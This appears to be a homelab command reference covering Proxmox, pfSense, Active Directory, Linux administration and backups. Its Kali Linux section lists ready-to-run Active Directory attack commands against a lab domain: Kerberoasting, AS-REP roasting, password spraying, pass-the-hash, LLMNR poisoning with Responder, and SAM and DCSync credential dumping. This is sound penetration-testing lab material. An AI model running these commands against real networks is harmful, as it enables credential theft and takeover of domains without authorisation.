# Useful Commands Reference

Quick reference for common homelab management tasks.

## Proxmox commands

### VM management

```bash
# List all VMs
qm list

# Start VM
qm start <VMID>

# Stop VM
qm stop <VMID>

# Shutdown VM gracefully
qm shutdown <VMID>

# Reboot VM
qm reboot <VMID>

# Check VM status
qm status <VMID>

# View VM configuration
qm config <VMID>

# Modify VM (example: change RAM)
qm set <VMID> -memory 4096

# Delete VM
qm destroy <VMID>
```

### Snapshot management

```bash
# Create snapshot
qm snapshot <VMID> <snapshot_name> --description "Description"

# List snapshots
qm listsnapshot <VMID>

# Rollback to snapshot
qm rollback <VMID> <snapshot_name>

# Delete snapshot
qm delsnapshot <VMID> <snapshot_name>
```

### Network management

```bash
# Show network interfaces
ip link show

# Show IP addresses
ip addr show

# Show routing table
ip route show

# Show bridges
brctl show

# Reload network configuration
ifreload -a

# Restart networking service
systemctl restart networking
```

### Storage management

```bash
# List storage
pvesm status

# Check disk usage
df -h

# Check LVM
lvs
vgs
pvs

# Remove old backups
rm /var/lib/vz/dump/vzdump-qemu-*
```

### System monitoring

```bash
# Check resource usage
top
htop

# Check memory
free -h

# Check disk I/O
iostat -x 1

# Check network traffic
iftop -i vmbr2

# View logs
tail -f /var/log/syslog
journalctl -f
```

## pfSense commands

Commands from pfSense shell (console menu option 8).

### Interface management

```bash
# Show interfaces
ifconfig

# Restart interface
ifconfig vtnet1 down
ifconfig vtnet1 up

# Release DHCP lease (WAN)
dhclient -r vtnet0

# Renew DHCP lease
dhclient vtnet0
```

### Firewall management

```bash
# Show firewall rules
pfctl -sr

# Show NAT rules
pfctl -sn

# Show states table
pfctl -ss

# Clear all states
pfctl -F states

# Reload firewall rules
pfctl -f /tmp/rules.debug

# Disable firewall (TEMPORARY - for troubleshooting)
pfctl -d

# Enable firewall
pfctl -e
```

### Network diagnostics

```bash
# Ping
ping -c 4 8.8.8.8

# Traceroute
traceroute 8.8.8.8

# Show routing table
netstat -rn

# DNS lookup
host google.com
nslookup google.com 8.8.8.8

# Show listening ports
sockstat -4 -l

# Packet capture
tcpdump -i vtnet1.20 -w /tmp/capture.pcap
```

### Service management

```bash
# Restart web interface
/etc/rc.restart_webgui

# Restart DNS resolver
/etc/rc.d/unbound restart

# Restart DHCP server
/etc/rc.d/dhcpd restart
```

## Active Directory commands

Commands from Domain Controller (PowerShell).

### User management

```powershell
# List all domain users
Get-ADUser -Filter *

# Get specific user
Get-ADUser -Identity "jon.snow"

# Create new user
New-ADUser -Name "Test User" -SamAccountName "testuser" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -Enabled $true

# Disable user
Disable-ADAccount -Identity "testuser"

# Reset password
Set-ADAccountPassword -Identity "testuser" -Reset -NewPassword (ConvertTo-SecureString "NewP@ssw0rd" -AsPlainText -Force)
```

### Group management

```powershell
# List all groups
Get-ADGroup -Filter *

# Get group members
Get-ADGroupMember -Identity "Domain Admins"

# Add user to group
Add-ADGroupMember -Identity "Domain Admins" -Members "testuser"

# Remove user from group
Remove-ADGroupMember -Identity "Domain Admins" -Members "testuser" -Confirm:$false
```

### Domain management

```powershell
# Check domain controllers
Get-ADDomainController -Filter *

# Check replication status
repadmin /replsummary

# Force replication
repadmin /syncall /AdeP

# Check FSMO roles
netdom query fsmo

# Check DNS zones
Get-DnsServerZone

# Check DNS records
Get-DnsServerResourceRecord -ZoneName "sevenkingdoms.local"
```

### Troubleshooting

```powershell
# Check AD services
Get-Service ADWS,KDC,NTDS,DNS | Select Name,Status

# Test domain connectivity
Test-ComputerSecureChannel -Verbose

# Check time sync
w32tm /query /status
w32tm /resync /force

# Check DNS
nslookup sevenkingdoms.local
Resolve-DnsName sevenkingdoms.local

# Domain join status
(Get-WmiObject Win32_ComputerSystem).Domain

# List domain controllers
nltest /dclist:sevenkingdoms.local
```

## Kali Linux commands

### Network reconnaissance

```bash
# Ping sweep
nmap -sn 192.168.20.0/24

# Port scan
nmap -sV -sC 192.168.20.10

# Fast scan with rustscan
rustscan -a 192.168.20.0/24

# Service enumeration
crackmapexec smb 192.168.20.0/24
crackmapexec winrm 192.168.20.0/24
```

### Active Directory enumeration

```bash
# SMB enumeration
crackmapexec smb 192.168.20.0/24 -u '' -p '' --shares
crackmapexec smb 192.168.20.0/24 -u 'guest' -p '' --users

# LDAP enumeration
ldapsearch -x -h 192.168.20.10 -b "DC=sevenkingdoms,DC=local"

# BloodHound collection
bloodhound-python -d sevenkingdoms.local -u user -p password -ns 192.168.20.10 -c All --zip

# Enumerate users with Impacket
impacket-GetADUsers -all sevenkingdoms.local/user:password -dc-ip 192.168.20.10

# Get SPNs (Kerberoasting)
impacket-GetUserSPNs sevenkingdoms.local/user:password -dc-ip 192.168.20.10 -request

# AS-REP Roasting
impacket-GetNPUsers sevenkingdoms.local/ -dc-ip 192.168.20.10 -usersfile users.txt -format hashcat
```

### Password attacks

```bash
# Hashcat (NTLM)
hashcat -m 1000 hashes.txt wordlist.txt

# Hashcat (Kerberos TGS)
hashcat -m 13100 tgs.hash wordlist.txt

# John the Ripper
john --format=NT hashes.txt
john --wordlist=wordlist.txt hashes.txt

# CrackMapExec password spray
crackmapexec smb 192.168.20.0/24 -u users.txt -p 'Password123'
```

### Exploitation

```bash
# Pass-the-Hash
crackmapexec smb 192.168.20.0/24 -u administrator -H <NTLM_hash>
impacket-psexec administrator@192.168.20.10 -hashes :<NTLM_hash>

# Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec sevenkingdoms.local/user@dc01.sevenkingdoms.local -k -no-pass

# Evil-WinRM
evil-winrm -i 192.168.20.10 -u administrator -p password

# Responder (LLMNR poisoning)
sudo responder -I eth0 -dwv
```

### Post-exploitation

```bash
# Dump SAM database
impacket-secretsdump sevenkingdoms.local/administrator:password@192.168.20.10

# DCSync attack
impacket-secretsdump -just-dc-ntlm sevenkingdoms.local/administrator:password@192.168.20.10

# Execute commands
crackmapexec smb 192.168.20.10 -u administrator -p password -x 'whoami'

# Upload file
impacket-smbclient sevenkingdoms.local/administrator:password@192.168.20.10
# Then: put local_file remote_file
```

## Network diagnostics

### Connectivity testing

```bash
# Basic ping
ping -c 4 192.168.20.10

# Traceroute
traceroute 192.168.20.10
traceroute -I 192.168.20.10  # ICMP mode

# TCP connection test
nc -zv 192.168.20.10 445

# Multiple port scan
nc -zv 192.168.20.10 135-139 445 3389
```

### Packet capture

```bash
# Capture on interface
tcpdump -i eth0 -w capture.pcap

# Capture specific host
tcpdump -i eth0 host 192.168.20.10 -w capture.pcap

# Capture specific port
tcpdump -i eth0 port 445 -w capture.pcap

# Capture between two hosts
tcpdump -i eth0 host 192.168.30.50 and host 192.168.20.10 -w capture.pcap

# Read capture file
tcpdump -r capture.pcap
```

### DNS testing

```bash
# Basic lookup
nslookup google.com

# Query specific server
nslookup google.com 8.8.8.8

# Reverse lookup
nslookup 192.168.20.10

# Query specific record type
dig sevenkingdoms.local A
dig sevenkingdoms.local MX
dig sevenkingdoms.local NS

# Zone transfer attempt
dig @192.168.20.10 sevenkingdoms.local AXFR
```

## System administration

### Service management (systemd)

```bash
# Start service
systemctl start <service>

# Stop service
systemctl stop <service>

# Restart service
systemctl restart <service>

# Check status
systemctl status <service>

# Enable at boot
systemctl enable <service>

# Disable at boot
systemctl disable <service>

# View logs
journalctl -u <service>
journalctl -u <service> -f  # Follow
```

### User management (Linux)

```bash
# Add user
useradd -m -s /bin/bash username

# Set password
passwd username

# Delete user
userdel -r username

# Add to sudo group
usermod -aG sudo username

# Switch user
su - username
```

### File permissions

```bash
# Change ownership
chown user:group file

# Change permissions
chmod 755 file
chmod u+x script.sh

# Recursive
chmod -R 644 directory/
chown -R user:group directory/
```

### Process management

```bash
# List processes
ps aux
ps aux | grep process_name

# Kill process
kill <PID>
kill -9 <PID>  # Force kill

# Kill by name
pkill process_name
killall process_name

# Background process
command &

# Bring to foreground
fg

# List background jobs
jobs
```

## Backup commands

### Proxmox backup

```bash
# Backup VM
vzdump <VMID> --storage local --mode snapshot

# Backup all VMs
vzdump --all --storage local --mode snapshot

# Restore backup
qmrestore /var/lib/vz/dump/vzdump-qemu-<VMID>-*.vma <VMID>
```

### Configuration backup

```bash
# Backup Proxmox network config
cp /etc/network/interfaces /etc/network/interfaces.backup

# Backup pfSense config (from web interface)
# Diagnostics > Backup & Restore > Download

# Backup Kali home directory
tar -czf kali-home-backup.tar.gz ~/*

# Backup with rsync
rsync -avz /source/ /destination/
```

## Quick troubleshooting

### Network issues

```bash
# Check interface status
ip link show

# Check IP configuration
ip addr show

# Check routing
ip route show

# Flush DNS cache (systemd-resolved)
systemd-resolve --flush-caches

# Restart network
systemctl restart networking
# or
ifreload -a
```

### Service issues

```bash
# Check service status
systemctl status <service>

# View recent logs
journalctl -u <service> -n 50

# Follow logs live
journalctl -u <service> -f

# Restart service
systemctl restart <service>
```

### Performance issues

```bash
# Check CPU usage
top
htop

# Check memory usage
free -h

# Check disk usage
df -h
du -sh /*

# Check disk I/O
iostat -x 1

# Check network usage
iftop -i eth0
```

## See also

* [Proxmox Commands Reference](https://pve.proxmox.com/pve-docs/)
* [pfSense Commands Reference](https://docs.netgate.com/pfsense/en/latest/)
* [Active Directory PowerShell](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)
* [Impacket Tools](https://github.com/fortra/impacket/tree/master/examples)
* [CrackMapExec Wiki](https://wiki.porchetta.industries/)
